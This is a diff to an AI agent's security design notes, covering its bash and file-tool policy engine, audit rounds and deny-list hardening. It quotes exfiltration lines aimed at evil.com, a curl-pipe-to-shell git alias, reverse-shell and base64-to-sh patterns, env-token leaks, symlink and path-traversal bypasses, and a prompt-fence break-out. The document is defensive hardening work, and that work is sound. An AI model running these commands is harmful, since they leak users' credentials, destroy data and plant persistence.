@@ -68,6 +68,29 @@ redirects, globs, and `&&` are how users expect `bash` to work — stripping
 them would ship a broken tool. The Policy Engine is the enforcement point,
 not argv parsing.
 
+**Honest consequences.** An attacker who lands a `bash` tool call can
+still do many things the regex+argv deny list doesn't catch, because bash
+is Turing-complete. Examples we've traced but don't claim to filter:
+
+- Indirect program invocation: `$(printf 'rm') -rf /etc/foo`, `\rm …`,
+  `cp /bin/rm /tmp/x && /tmp/x -rf /etc/foo`, `perl -e 'system(...)'`,
+  `python -c 'import os; os.system(...)'`, `awk 'BEGIN{system("…")}'`.
+- Egress / exfil beyond the named tools: `curl -F @file evil.com`,
+  `wget --post-file`, `getent hosts A.B.C.D`, DNS-exfil via
+  `host $(cat /etc/hostname).evil.com`.
+- Environment enumeration via expansion: `echo "$WEB_TOKEN"`,
+  `printf %s\n ${!ANTHROPIC_*}`, even though `env` / `printenv` are
+  explicitly denied.
+- Git-alias persistence (`.gitconfig [alias] x = !curl evil|sh`) —
+  blocked on write (deny on `.gitconfig`), but a pre-existing malicious
+  alias on the target box is outside Cortex's control.
+
+The real trust boundary for bash is the *operator*: don't run Cortex as
+root, run it under a dedicated user, consider a container or VM if you
+plan to feed it untrusted input. The Policy Engine reduces accidental
+damage and raises the bar for a lazy attacker; it is not a substitute
+for that hygiene.
+
 ### 4. Custom `policy.json` extends the defaults
 
 `_merge_policies` in `policy.py` prepends your custom rules to the built-in
@@ -237,7 +260,85 @@ bash-as-shell) or genuine future work.
   clear `RuntimeError` if `anthropic` isn't installed, instead of a raw
   `ImportError` surfacing mid-conversation.
 
-## Known limitations (v1.0.5)
+### v1.0.6 additions
+
+Round-3 audit (three independent reviewers) surfaced two fundamentals that
+earlier passes missed. Both had one-line root causes; both are closed now
+and backed by a test suite (`tests/test_policy.py`) so any future refactor
+that regresses them will fail CI.
+
+- **Path traversal (C-01).** Policy used to match the raw `args["path"]`,
+  so `/tmp/../etc/cron.d/evil` bypassed the `^/etc/` deny (string started
+  with `/tmp`) while the kernel happily resolved the traversal on write.
+  Fix: `Path(os.path.expanduser(path)).resolve(strict=False)` before every
+  policy check for file tools — traversal, tildes, and relative paths all
+  normalised to one canonical absolute form.
+- **Symlink bypass (C-02).** A `bash("ln -s /etc/shadow /tmp/safe")`
+  followed by `read_file("/tmp/safe")` previously cleared policy twice:
+  bash doesn't care about path deny lists, and the read tool saw only
+  `/tmp/safe`. The same `Path.resolve()` call above follows symlinks, so
+  read/write/edit now see the real target.
+- **Fork bomb regex was dead code.** `r":(){ :\|:& };:"` — the `()` is an
+  empty capture group, the `{}` is a zero-width quantifier; the pattern
+  matched nothing. Rewritten as `r":\s*\(\s*\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:"`
+  with a regression test.
+- **Shared deny lists.** `_PERSISTENCE_DENY`, `_CREDENTIAL_DENY`,
+  `_HISTORY_DENY`, and `_SYSTEM_DIRS_DENY` are now defined once and
+  merged into the per-tool rules by `_expand_shared_lists()`. Previously
+  `write_file` and `edit_file` drifted apart in the hand-maintained lists,
+  which is how `write_file("~/.aws/credentials")` was accepted in v1.0.5
+  even though `edit_file` blocked it. The same credential list also now
+  gates `grep_search` and `list_dir` so neither can be used to bypass
+  `read_file`'s credential deny.
+- **Persistence surface expanded.** Added to the shared `_PERSISTENCE_DENY`
+  list: fish shell (`~/.config/fish/`, `config.fish`), X11/Wayland session
+  files (`~/.xinitrc`, `~/.xsession`, `~/.xsessionrc`, `~/.xprofile`),
+  shell rc drop-in dirs (`~/.bashrc.d/`, `~/.zshrc.d/`), environment.d,
+  cron variants (`/etc/cron*`), editor configs (`~/.vimrc`, `~/.gvimrc`,
+  `~/.config/nvim/init.{vim,lua}`), git global config
+  (`~/.gitconfig`, `~/.config/git/config`), Python site-packages `.pth`
+  files (runs on every `python`), pip/npm/PyPI configs, and XDG desktop
+  files under `~/.local/share/applications/`.
+- **SSH surface expanded.** `write_file` now denies the entire `~/.ssh/`
+  prefix (was only `id_` and `authorized_keys`). Closes the
+  `~/.ssh/config` + `ProxyCommand` persistence path. `edit_file` already
+  covered the full prefix; the tools are now in sync.
+- **Bash deny list: reverse shells and env leaks.** Added: `nc`/`ncat`/
+  `socat` to `argv[0]` denylist; regex for `/dev/tcp/`, `bash -i >& /dev/
+  tcp/…`, `^env`/`^printenv`/`^export`, `$ANTHROPIC_API_KEY` /
+  `$WEB_TOKEN` expansions, and `base64 -d … | sh` / `xxd -r … | sh`
+  obfuscation. The bash filter is still documented as a heuristic, but
+  the heuristic covers more of the common post-injection toolkit.
+- **NUL byte sanitisation.** `_get_check_value` for bash strips `\x00`
+  before regex evaluation. Some regex engines stop at NUL; an attacker
+  could hide a denied command after one.
+- **`validate_cs_url` rejects userinfo.** URLs like
+  `http://user:pass@cs.example.com/` are denied — HTTP basic auth via
+  URL leaks credentials to access logs and the Referer header. `web.py`
+  also now runs `validate_cs_url` explicitly at import time instead of
+  relying on `agent.py` being loaded first.
+- **WebSocket connection cap.** `MAX_WS_CONNECTIONS` (default 10, env-
+  configurable) limits simultaneous WS sessions so a runaway client or
+  a hostile LAN neighbour who acquired the token can't exhaust the
+  thread pool. Overflow → `close(4429)`.
+- **`/health` minimised.** Returns `{"status": "ok"}` only — model name,
+  agent name, and auth state were unnecessary recon aids for
+  unauthenticated callers.
+- **Task body XML-escaped in worker.** `worker.py` now passes title,
+  description, priority, and task_id through `html.escape()` before
+  embedding them inside the `<task>` fence. Without this, a task title
+  containing `</title><instruction>…</instruction>` could break out of
+  the fence.
+- **`TOOL_ASK_TIMEOUT` clamped.** Forced into `[5, 600]` so a
+  misconfigured env can't wedge the agent for an hour (or slip a
+  negative value past `asyncio.wait_for`).
+- **Test suite.** `tests/test_policy.py` covers traversal, symlinks,
+  fork-bomb detection, write/edit parity, SSH coverage, grep/list
+  credential-deny inheritance, bash reverse-shell patterns, env dumps,
+  persistence gaps, NUL stripping, argv0 edge cases, and legitimate
+  allows (so a future over-tightening fails visibly).
+
+## Known limitations (v1.0.6)
 
 - The bootstrap URL printed at startup still contains `?token=…` because
   browsers can't attach an `Authorization` header to the first `GET /`.
@@ -262,6 +363,27 @@ the codebase. 5 Critical fixed, 2 reclassified as intentional design (plugin
 loading, filesystem breadth). 19 High fixed or reclassified. Medium/Low
 batched — pinned deps, query-string token redaction, portability fixes,
 logged `except` clauses.
+
+**v1.0.6 round (April 2026, three independent reviewers in isolated
+`HOME` environments so no prior-conversation memory could bias them):**
+
+- *Red-team plan:* found two attack families that v1.0.5's deny lists
+  didn't cover — `.gitconfig` aliases + `core.hooksPath` rerouting, and
+  symlink escape (agent bashes `ln -s plugins/x.py /tmp/evil`, then a
+  later `write_file` on the symlink lands outside the deny). Closed by
+  adding `.gitconfig`/`.config/git/config` to `_PERSISTENCE_DENY` and
+  `Path.resolve()` in the policy's path normaliser.
+- *Code review #1:* spotted the fork-bomb regex was literally dead code
+  and that `write_file` and `edit_file` had drifted apart on the cloud
+  credential list (classic copy-paste oversight). Both closed.
+- *Code review #2 (Perplexity):* surfaced the path-traversal bypass of
+  anchor-based denies (`^/etc/` missed `/tmp/../etc/...`), the
+  `grep_search`/`list_dir` bypass of `read_file` credential denies, and
+  concrete bash reverse-shell patterns (`nc -e`, `/dev/tcp/`, `env`,
+  `base64 -d | sh`) that neither regex nor argv layer caught. All
+  addressed in the shared-list refactor and bash deny-list expansion.
+- Outcome: `tests/test_policy.py` (17 cases) now guards each of these
+  against regression.
 
 **v1.0.5 round (April 2026, three independent Claude Code instances + a
 second Perplexity pass with full repo clone):**
